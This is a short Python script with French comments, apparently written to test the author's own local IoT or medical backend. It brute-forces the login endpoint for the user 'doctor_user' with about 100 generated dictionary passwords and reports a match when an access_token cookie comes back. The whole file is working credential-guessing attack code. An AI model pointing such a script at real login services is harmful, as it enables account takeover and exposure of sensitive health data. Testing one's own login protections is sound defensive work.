import requests
from time import sleep
from itertools import product

URL = "https://localhost:8000/login"
USERNAME = "doctor_user"
CERT = "../server/certs/cert.pem"

# Dictionnaire étendu simulé
prefixes = ["iot", "med", "admin", "user", "tet", "pass"]
suffixes = ["123", "2024", "!", "@", "iot", "00", "01"]
base_words = ["health", "secure", "monitor", "alert", "care", "sensor"]

# Générer les mots de passe automatiquement
common_passwords = [w + s for w, s in product(base_words + prefixes, suffixes)]
common_passwords += ["123456", "password", "azerty", "iotbackend", "adminadmin", "patient", "abc123", "letmein"]

# Retirer doublons
passwords = list(set(common_passwords))[:100]  # garder 100 max

session = requests.Session()

for pwd in passwords:
    try:
        resp = session.post(
            URL,
            data={"username": USERNAME, "password": pwd},
            verify=CERT,
            allow_redirects=False
        )

        if resp.status_code == 302 and "access_token" in resp.cookies:
            print(f"✅ Mot de passe trouvé : {pwd}")
            break
        elif "identifiants invalides" in resp.text:
            print(f"❌ Mot de passe incorrect : {pwd}")
        else:
            print(f"⚠️ Réponse inattendue ({resp.status_code}) pour : {pwd}")

        sleep(0.3)
    except Exception as e:
        print(f"Erreur avec {pwd}: {e}")
